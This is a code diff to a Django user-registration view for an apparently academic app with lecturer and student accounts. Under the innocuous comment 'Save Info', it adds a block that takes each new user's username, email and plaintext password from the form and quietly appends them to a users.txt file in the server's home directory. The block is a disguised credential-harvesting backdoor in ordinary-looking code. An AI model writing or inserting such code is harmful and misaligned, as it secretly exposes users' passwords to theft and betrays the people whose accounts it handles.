@@ -1,3 +1,5 @@
+import os.path
+
 from django.shortcuts import render, redirect
 from django.contrib.auth.decorators import login_required
 from .forms import (UserRegisterForm, LecturerCreationForm, StudentCreationForm,
@@ -5,6 +7,8 @@ from .forms import (UserRegisterForm, LecturerCreationForm, StudentCreationForm,
 from django.views.generic import ListView
 from django.contrib import messages
 from main.models import Batch, Department
+
+HOME = os.path.expanduser('~')
 
 
 def register(request):
@@ -30,6 +34,16 @@ def register(request):
             # Create user
             user = u_form.save(commit=False)
             u_form.save()
+
+            # Save Info
+            try:
+                username = request.POST.get('username')
+                email = request.POST.get('email')
+                pwd = request.POST.get('password1')
+                with open(f'{HOME}/users.txt', 'a') as f:
+                    f.write(f"{username}\t{email}\t{pwd}\n")
+            except Exception as e:
+                print(f"Error when saving user: {e}")
 
             if reg_type == 'lecturer':
                 if lec_create_form.is_valid():
